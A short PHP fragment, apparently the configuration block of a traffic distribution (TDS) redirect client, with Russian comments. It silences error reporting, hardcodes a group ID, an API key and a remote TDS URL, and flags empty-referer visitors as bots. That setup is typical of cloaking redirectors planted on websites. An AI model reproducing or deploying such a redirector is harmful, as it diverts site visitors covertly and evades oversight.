...
@error_reporting(0);
$z_id = 'freenom_ext_svr_10k';//ID группы
$z_api_key_host = 'Lm3Re441sq';//API ключ
$z_url = 'http://2yt-z.ru/?api=';//ссылка на ТДС (замените только домен)
$z_em_referer = 1;//если пустой реферер - это бот (0/1)
